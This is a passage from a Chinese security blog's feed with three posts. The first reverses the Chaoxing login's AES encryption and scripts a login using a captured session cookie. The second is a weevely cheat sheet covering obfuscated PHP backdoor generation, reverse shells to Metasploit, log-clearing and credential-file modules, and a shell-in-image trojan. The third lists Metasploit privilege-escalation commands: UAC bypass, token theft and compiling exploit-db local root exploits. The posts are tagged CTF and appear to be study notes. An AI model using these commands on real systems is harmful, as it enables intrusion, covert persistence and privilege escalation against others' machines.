function_">encryptByAES</span>(<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;u2oh6Vu^HWe4_AES&#x27;</span>));</span><br></pre></td></tr></table></figure><p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/8.png"><br><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/9.png"></p><blockquote>此时发现报错了运行不了，提示CryptoJS未定义。回去源代码处，查到它在哪里会有CrytoJS，找到了之后点进去。</blockquote><p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/10.png"><br><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/11.png"></p><blockquote>点进来发现代码好多，不方便分析，干脆直接全部复制下来，放到原来encryptByAES方法的上面，再次点运行，发现没有报错，运行结果也与实际一致。</blockquote><p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/12.png"></p><blockquote>同样，可以将解密的function放到js中运行，为了方便，可以用python进行加解密的复现。</blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> <span class="title class_">Crypto</span>.<span class="property">Cipher</span> <span class="keyword">import</span> <span class="variable constant_">AES</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">AESKEY</span> = <span class="string">&#x27;u2oh6Vu^HWe4_AES&#x27;</span>  # 密钥</span><br><span class="line"><span class="variable constant_">AESIV</span> = <span class="string">&#x27;u2oh6Vu^HWe4_AES&#x27;</span>  # 和<span class="variable constant_">KEY</span>保持一致即可</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESTool</span>:</span><br><span class="line">    def <span class="title function_">__init__</span>(self):</span><br><span class="line">        self.<span class="property">key</span> = <span class="variable constant_">AESKEY</span>.<span class="title function_">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        self.<span class="property">iv</span> = <span class="variable constant_">AESIV</span>.<span class="title function_">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">pkcs7padding</span>(self, text):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        明文使用PKCS7填充</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        bs = <span class="number">16</span></span><br><span class="line">        length = <span class="title function_">len</span>(text)</span><br><span class="line">        bytes_length = <span class="title function_">len</span>(text.<span class="title function_">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        padding_size = length <span class="keyword">if</span> (bytes_length == length) <span class="keyword">else</span> bytes_length</span><br><span class="line">        padding = bs - padding_size % bs</span><br><span class="line">        padding_text = <span class="title function_">chr</span>(padding) * padding</span><br><span class="line">        self.<span class="property">coding</span> = <span class="title function_">chr</span>(padding)</span><br><span class="line">        <span class="keyword">return</span> text + padding_text</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">aes_encrypt</span>(self, content):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        AES加密</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        cipher = <span class="variable constant_">AES</span>.<span class="title function_">new</span>(self.<span class="property">key</span>, <span class="variable constant_">AES</span>.<span class="property">MODE_CBC</span>, self.<span class="property">iv</span>)</span><br><span class="line">        # 处理明文</span><br><span class="line">        content_padding = self.<span class="title function_">pkcs7padding</span>(content)</span><br><span class="line">        # 加密</span><br><span class="line">        encrypt_bytes = cipher.<span class="title function_">encrypt</span>(content_padding.<span class="title function_">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        # 重新编码</span><br><span class="line">        result = <span class="title function_">str</span>(base64.<span class="title function_">b64encode</span>(encrypt_bytes), encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">aes_decrypt</span>(self, content):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        AES解密</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        cipher = <span class="variable constant_">AES</span>.<span class="title function_">new</span>(self.<span class="property">key</span>, <span class="variable constant_">AES</span>.<span class="property">MODE_CBC</span>, self.<span class="property">iv</span>)</span><br><span class="line">        content = base64.<span class="title function_">b64decode</span>(content)</span><br><span class="line">        text = cipher.<span class="title function_">decrypt</span>(content).<span class="title function_">decode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.<span class="title function_">pkcs7padding</span>(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    a = <span class="title class_">AESTool</span>() #实例化一个对象</span><br><span class="line">    username=a.<span class="title function_">aes_encrypt</span>(<span class="title function_">input</span>(<span class="string">&#x27;用户名:&#x27;</span>)) #调用<span class="keyword">class</span>中<span class="title class_">AESTool</span>里的aes_encrypt方法</span><br><span class="line">    pwd=a.<span class="title function_">aes_encrypt</span>(<span class="title function_">input</span>(<span class="string">&#x27;密码:&#x27;</span>))</span><br><span class="line">    aes_username = username #这里传一下值给另一个变量，待会要用到</span><br><span class="line">    aes_pwd = pwd</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&#x27;加密后的用户名:&#x27;</span>+aes_username)</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&#x27;加密后的密码:&#x27;</span>+aes_pwd)</span><br></pre></td></tr></table></figure><blockquote>加密后结果一致。</blockquote><p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/13.png"></p><blockquote>那么如何使用python实现学习通登录呢？先看看正常登录成功发送的表单。</blockquote><p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/14.png"></p><blockquote>利用python的requests构造请求，编写的完整代码如下。</blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="title class_">Crypto</span>.<span class="property">Cipher</span> <span class="keyword">import</span> <span class="variable constant_">AES</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">AESKEY</span> = <span class="string">&#x27;u2oh6Vu^HWe4_AES&#x27;</span>  # 密钥</span><br><span class="line"><span class="variable constant_">AESIV</span> = <span class="string">&#x27;u2oh6Vu^HWe4_AES&#x27;</span>  # 和<span class="variable constant_">KEY</span>保持一直即可</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESTool</span>:</span><br><span class="line">    def <span class="title function_">__init__</span>(self):</span><br><span class="line">        self.<span class="property">key</span> = <span class="variable constant_">AESKEY</span>.<span class="title function_">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        self.<span class="property">iv</span> = <span class="variable constant_">AESIV</span>.<span class="title function_">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">pkcs7padding</span>(self, text):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        明文使用PKCS7填充</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        bs = <span class="number">16</span></span><br><span class="line">        length = <span class="title function_">len</span>(text)</span><br><span class="line">        bytes_length = <span class="title function_">len</span>(text.<span class="title function_">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        padding_size = length <span class="keyword">if</span> (bytes_length == length) <span class="keyword">else</span> bytes_length</span><br><span class="line">        padding = bs - padding_size % bs</span><br><span class="line">        padding_text = <span class="title function_">chr</span>(padding) * padding</span><br><span class="line">        self.<span class="property">coding</span> = <span class="title function_">chr</span>(padding)</span><br><span class="line">        <span class="keyword">return</span> text + padding_text</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">aes_encrypt</span>(self, content):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        AES加密</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        cipher = <span class="variable constant_">AES</span>.<span class="title function_">new</span>(self.<span class="property">key</span>, <span class="variable constant_">AES</span>.<span class="property">MODE_CBC</span>, self.<span class="property">iv</span>)</span><br><span class="line">        # 处理明文</span><br><span class="line">        content_padding = self.<span class="title function_">pkcs7padding</span>(content)</span><br><span class="line">        # 加密</span><br><span class="line">        encrypt_bytes = cipher.<span class="title function_">encrypt</span>(content_padding.<span class="title function_">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        # 重新编码</span><br><span class="line">        result = <span class="title function_">str</span>(base64.<span class="title function_">b64encode</span>(encrypt_bytes), encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">aes_decrypt</span>(self, content):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        AES解密</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        cipher = <span class="variable constant_">AES</span>.<span class="title function_">new</span>(self.<span class="property">key</span>, <span class="variable constant_">AES</span>.<span class="property">MODE_CBC</span>, self.<span class="property">iv</span>)</span><br><span class="line">        content = base64.<span class="title function_">b64decode</span>(content)</span><br><span class="line">        text = cipher.<span class="title function_">decrypt</span>(content).<span class="title function_">decode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.<span class="title function_">pkcs7padding</span>(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    a = <span class="title class_">AESTool</span>() #实例化一个对象</span><br><span class="line">    username=a.<span class="title function_">aes_encrypt</span>(<span class="title function_">input</span>(<span class="string">&#x27;用户名:&#x27;</span>)) #调用<span class="keyword">class</span>中<span class="title class_">AESTool</span>里的aes_encrypt方法</span><br><span class="line">    pwd=a.<span class="title function_">aes_encrypt</span>(<span class="title function_">input</span>(<span class="string">&#x27;密码:&#x27;</span>))</span><br><span class="line">    aes_username = username #这里传一下值给另一个变量，待会要用到</span><br><span class="line">    aes_pwd = pwd</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&#x27;加密后的用户名:&#x27;</span>+aes_username)</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&#x27;加密后的密码:&#x27;</span>+aes_pwd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">session = requests.<span class="title function_">session</span>()</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;passport2.chaoxing.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;248&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&quot;\&quot;Chromium\&quot;;v=\&quot;106\&quot;, \&quot;Microsoft Edge\&quot;;v=\&quot;106\&quot;, \&quot;Not;A=Brand\&quot;;v=\&quot;99\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/javascript, */*; q=0.01&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua-platform&quot;</span>: <span class="string">&quot;\&quot;Windows\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://passport2.chaoxing.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://passport2.chaoxing.com/login?fid=&amp;newversion=true&amp;refer=https://i.chaoxing.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;fid=23194; route=52ffa9af7a380e114204ed76732d509c; JSESSIONID=F7C40528A60B7D04420D26319385CD5A; source=\&quot;\&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;https://passport2.chaoxing.com/fanyalogin&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;fid&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uname&quot;</span>: aes_username,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: aes_pwd,</span><br><span class="line">    <span class="string">&quot;refer&quot;</span>: <span class="string">&quot;http%3A%2F%2Fi.chaoxing.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;t&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">    <span class="string">&quot;forbidotherlogin&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;validate&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;doubleFactorLogin&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;independentId&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">session.<span class="property">headers</span> = headers</span><br><span class="line">response = session.<span class="title function_">post</span>(url, headers=headers, data=data)</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;登陆中......&#x27;</span>)</span><br><span class="line"><span class="title function_">print</span>(response.<span class="property">text</span>)</span><br><span class="line"><span class="title function_">print</span>(response)</span><br></pre></td></tr></table></figure><blockquote>到这里已经成功登录了！！！</blockquote><p><img src="/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E9%80%9A%E9%80%86%E5%90%91/15.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;打开浏览器，进入学习通登录页面。F12——随便输入账号密码点击登录——网络——fanyalogin–负载，这里发现uname和password使用了加密手段进行加密。&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/%E8%AE%B0%E4%B8%</summary>
      
    
    
    
    
    <category term="逆向" scheme="https://jielunya.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>weevely工具的使用</title>
    <link href="https://jielunya.github.io/2023/01/12/weevely%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://jielunya.github.io/2023/01/12/weevely%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2023-01-12T14:24:03.249Z</published>
    <updated>2023-01-14T07:30:36.268Z</updated>
    
    <content type="html"><![CDATA[<h2 id="生成shell"><a href="#生成shell" class="headerlink" title="生成shell"></a>生成shell</h2><blockquote>weevely generate 密码 路径 文件名</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely generate cmd ./backdoor.php(weevely --man中有命令)</span><br><span class="line"></span><br><span class="line">weevely generate -obfuscator cleartext1_php cmd ./backdoor.php (用模板生成混淆的shell，weevely -generate --help中有命令)</span><br></pre></td></tr></table></figure><h2 id="连接shell"><a href="#连接shell" class="headerlink" title="连接shell"></a>连接shell</h2><blockquote>weevely url 密码</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely http://127.0.0.1/backdoor.php cmd</span><br></pre></td></tr></table></figure><h2 id="各项模块"><a href="#各项模块" class="headerlink" title="各项模块"></a>各项模块</h2><p>键入:help查看更多帮助信息</p><blockquote>weevely>:help</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">信息搜集：</span><br><span class="line"> :shell_su                     通过更变使用者来执行shell命令，可以获得root权限来执行命令.                                         </span><br><span class="line"> :shell_sh                     执行 shell 命令，例如:shell_php system(&#x27;dir&#x27;);                                             </span><br><span class="line"> :shell_php                    执行 PHP 命令.                                                </span><br><span class="line"> :system_extensions            收集PHP和webserver扩展列表                           </span><br><span class="line"> :system_info                  收集系统信息                                          </span><br><span class="line"> :system_procs                 列出正在运行的进程                                              </span><br><span class="line"> :audit_disablefunctionbypass  使用mod_cgi和.htaccess绕过系统禁用函数的限制。它会上传.htaccess和CGI脚本，并在远程服务器上运行伪系统shell     </span><br><span class="line"> :audit_etcpasswd              查看/etc/passwd文件                           </span><br><span class="line"> :audit_suidsgid               查找带有SUID或SGID标志的文件。                                  </span><br><span class="line"> :audit_phpconf                查看php配置信息                                             </span><br><span class="line"> :audit_filesystem             审核文件系统的弱权限。枚举各种系统目录并寻找可读写执行的目录，模块仅默认搜索部分linux下的常见目录，logs、root、home等                         </span><br><span class="line"> :backdoor_reversetcp          执行反向TCP shell. 需要nc -lvp &lt;port&gt;监听                                        </span><br><span class="line"> :backdoor_tcp                 在TCP端口上生成shell                                         </span><br><span class="line"> :net_scan                     TCP端口扫描.                                                       </span><br><span class="line"> :net_mail                     发送邮件.                                                           </span><br><span class="line"> :net_ifconfig                 获取网络接口地址.                                    </span><br><span class="line"> :net_curl                     执行类似curl的HTTP请求.                                    </span><br><span class="line"> :net_proxy                    运行本地代理以通过目标转移HTTP / HTTPS浏览 </span><br><span class="line"> :net_phpproxy                 在目标上安装PHP代理.                                     </span><br><span class="line"> :bruteforce_sql               可用来猜解数据库密码.                                             </span><br><span class="line"> :file_find                    查找具有给定名称和属性的文件.                          </span><br><span class="line"> :file_download                从远程文件系统下载文件.                                </span><br><span class="line"> :file_check                   获取文件的属性和权限.                            </span><br><span class="line"> :file_touch                   更改文件时间戳.                                               </span><br><span class="line"> :file_cd                      更改当前工作目录.                                    </span><br><span class="line"> :file_grep                    打印与多个文件中的模式匹配的行.                    </span><br><span class="line"> :file_gzip                    压缩或解压gzip文件.                                       </span><br><span class="line"> :file_tar                     压缩或解压tar文件.                                     </span><br><span class="line"> :file_enum                    检查路径列表的存在和权限</span><br><span class="line"> :file_bzip2                   压缩或解压bzip2文件.                                      </span><br><span class="line"> :file_mount                   使用HTTPfs挂载远程文件系统.                                </span><br><span class="line"> :file_clearlog                从文件中删除字符串.                                           </span><br><span class="line"> :file_zip                     压缩或解压zip文件.                                        </span><br><span class="line"> :file_cp                      复制单个文件.                                                    </span><br><span class="line"> :file_upload2web              自动将文件上传到Web文件夹并获取相应的URL. </span><br><span class="line"> :file_edit                    在本地编辑器上编辑远程文件.                                  </span><br><span class="line"> :file_read                    从远程文件系统中读取远程文件.                         </span><br><span class="line"> :file_webdownload             指定URL下载文件.                                                     </span><br><span class="line"> :file_upload                  文件上载到远程文件系统.                                    </span><br><span class="line"> :file_ls                      列出目录内容.                                              </span><br><span class="line"> :file_rm                      删除远程文件.                                                  </span><br><span class="line"> :sql_dump                     Multi dbms mysqldump replacement.                                    </span><br><span class="line"> :sql_console                  执行SQL查询或运行sql控制台. </span><br></pre></td></tr></table></figure><h2 id="反向shell连接MSF"><a href="#反向shell连接MSF" class="headerlink" title="反向shell连接MSF"></a>反向shell连接MSF</h2><blockquote>在这使用:backdoor_meterpreter参数</blockquote><blockquote>:backdoor_meterpreter反向shell</blockquote><blockquote>-payload php/meterpreter/reverse_tcp是搭载的攻击载荷</blockquote><blockquote>-lhost 转发给监听的ip地址</blockquote><blockquote>-lport   监听端口</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely&gt;:backdoor_meterpreter -payload php/meterpreter/reverse_tcp -lhost 127.0.0.1 -port 4444</span><br></pre></td></tr></table></figure><blockquote>转发完成，接下来就是打开msf使用监听模块监听，获取控制权</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt;use exploit/multi/handler #使用监听模块</span><br><span class="line">show options</span><br><span class="line">set payload php/meterpreter/reverse_tcp #使用与上面相同的payload</span><br><span class="line">set Lhost 127.0.0.1</span><br><span class="line">set Lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="合成图片木马"><a href="#合成图片木马" class="headerlink" title="合成图片木马"></a>合成图片木马</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat image.png shell.php &gt; shell.png</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;生成shell&quot;&gt;&lt;a href=&quot;#生成shell&quot; class=&quot;headerlink&quot; title=&quot;生成shell&quot;&gt;&lt;/a&gt;生成shell&lt;/h2&gt;&lt;blockquote&gt;weevely generate 密码 路径 文件名&lt;/blockquote&gt;

</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>利用MSF进行系统提权</title>
    <link href="https://jielunya.github.io/2022/12/24/%E5%88%A9%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/"/>
    <id>https://jielunya.github.io/2022/12/24/%E5%88%A9%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/</id>
    <published>2022-12-24T13:09:38.000Z</published>
    <updated>2022-12-24T15:33:37.872Z</updated>
    
    <content type="html"><![CDATA[<h2 id="直接输入提升权限命令"><a href="#直接输入提升权限命令" class="headerlink" title="直接输入提升权限命令"></a>直接输入提升权限命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;getsystem</span><br></pre></td></tr></table></figure><h2 id="使用MSF内置BYPASSUAC提权"><a href="#使用MSF内置BYPASSUAC提权" class="headerlink" title="使用MSF内置BYPASSUAC提权"></a>使用MSF内置BYPASSUAC提权</h2><blockquote>MSF内置有多个bypassuac模块，原理有所不同，使用方法类似，运行后返回一个新会话后再次执行getsystem获取系统权限。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6&gt;search bypassuac</span><br><span class="line"></span><br><span class="line">exploit/windows/local/bypassuac</span><br><span class="line">exploit/windows/local/bypassuac_comhijack</span><br><span class="line">exploit/windows/local/bypassuac_eventvwr </span><br><span class="line">exploit/windows/local/bypassuac_fodhelper</span><br><span class="line">exploit/windows/local/bypassuac_injection</span><br><span class="line">exploit/windows/local/bypassuac_injection_winsxs</span><br><span class="line">exploit/windows/local/bypassuac_sluihijack</span><br><span class="line">exploit/windows/local/bypassuac_vbs</span><br></pre></td></tr></table></figure><h2 id="使用MSF的enum-patches模块"><a href="#使用MSF的enum-patches模块" class="headerlink" title="使用MSF的enum_patches模块"></a>使用MSF的enum_patches模块</h2><blockquote>使用MSF的enum_patches模块，收集补丁信息，然后查找可用exploits进行提权</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;run post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure><blockquote>自行根据不同的补丁所存在的漏洞使用msf存在的脚本进行权限提升</blockquote><h2 id="令牌操作-INCOGNITO假冒令牌"><a href="#令牌操作-INCOGNITO假冒令牌" class="headerlink" title="令牌操作 INCOGNITO假冒令牌"></a>令牌操作 INCOGNITO假冒令牌</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;use incognito   #加载incognito模块</span><br><span class="line"></span><br><span class="line">meterpreter&gt;list_tokens -u  #查看可用的token</span><br><span class="line"></span><br><span class="line">meterpreter&gt;impersonate_token &#x27;PIG\testpig&#x27; #此处假设PIG\testpig为可用token</span><br><span class="line"></span><br><span class="line">execute -f cmd.exe -i -t      #  -t 使用假冒的token执行cmd.exe，亦可以直接输入shell进入当前token的终端</span><br><span class="line"></span><br><span class="line">rev2self  #返回原始token</span><br></pre></td></tr></table></figure><h2 id="STEAL-TOKEN窃取令牌"><a href="#STEAL-TOKEN窃取令牌" class="headerlink" title="STEAL_TOKEN窃取令牌"></a>STEAL_TOKEN窃取令牌</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;ps #先ps列出进程详细信息</span><br><span class="line"></span><br><span class="line">meterpreter&gt;steal_token &lt;pid值&gt; #从指定进程中窃取token</span><br><span class="line"></span><br><span class="line">meterpreter&gt;rev2self #返回原始token</span><br></pre></td></tr></table></figure><h2 id="利用metaspolit的内置模块Local-Exploit-Suggester"><a href="#利用metaspolit的内置模块Local-Exploit-Suggester" class="headerlink" title="利用metaspolit的内置模块Local Exploit Suggester"></a>利用metaspolit的内置模块Local Exploit Suggester</h2><blockquote>这个模块可以帮助我们识别系统存在哪些漏洞可以被利用，在拿到meterpreter会话的前提下，通过扫描，然后列出提供最合适的exp，通过合适的exp我们可以进一步提权。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">set LHOST &lt;ip地址&gt;</span><br><span class="line"></span><br><span class="line">set SESSION 1 #会话id</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="使用Ubuntu本地提权漏洞"><a href="#使用Ubuntu本地提权漏洞" class="headerlink" title="使用Ubuntu本地提权漏洞"></a>使用Ubuntu本地提权漏洞</h2><p>案例1:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先使用命令lsb_release -a查看系统发行的版本。</span><br><span class="line">同时使用命令uname -a查看内核版本信息</span><br></pre></td></tr></table></figure><blockquote>此处假设目标靶机的操作系统是Ubuntu 14.04.4 LTS，内核版本为3.13.0-45-generic</blockquote></blockquote>第一种方法：使用常规的溢出漏洞overlayfs，支持ubuntu 12.04/14.04/14.10/15.04和内核版本大于3.13.0小于3.19。</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit overlayfs ubuntu local #搜索中关键字overlayfs的ubuntu本地提权利用漏洞的源码</span><br><span class="line">复制/usr/share/exploitdb/exploits/linux/local/37292.c至/root目录 #此处假设源码为37292.c</span><br><span class="line">进入Meterpreter命令行，使用命令upload 37292.c将该exp上传至靶机</span><br><span class="line">最后使用命令shell打开靶机的终端</span><br><span class="line">使用命令gcc -o overlayfs 37292.c #编译exp（-o参数为命名）</span><br><span class="line">然后使用命令chmod 777 overlayfs 给exp进行赋权</span><br><span class="line">最后使用命令./overlayfs进行提权，最终获得靶机最高权限，</span><br></pre></td></tr></table></figure><p>案例2:</p><blockquote>此处假设目标靶机的操作系统是Ubuntu 16.04 LTS，内核版本为4.10.0-22-generic</blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6&gt;searchsploit Ubuntu 16.04 #此处找到一个合适的漏洞为45010</span><br><span class="line"></span><br><span class="line">cd /root</span><br><span class="line"></span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/45010.c ./    #把利用源码拷贝到当前目录</span><br><span class="line"></span><br><span class="line">gcc 45010.c -o 45010   #编译（-o参数为命名）</span><br><span class="line"></span><br><span class="line">meterpreter&gt;upload /root/45010 /tmp/45010 #(放到tem目录是因为tem目录一般都有权限)</span><br><span class="line"></span><br><span class="line">meterpreter&gt;shell</span><br><span class="line"></span><br><span class="line">cd /tem</span><br><span class="line"></span><br><span class="line">chmod +x 45010</span><br><span class="line"></span><br><span class="line">./45010</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;直接输入提升权限命令&quot;&gt;&lt;a href=&quot;#直接输入提升权限命令&quot; class=&quot;headerlink&quot; title=&quot;直接输入提升权限命令&quot;&gt;&lt;/a&gt;直接输入提升权限命令&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;tabl</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
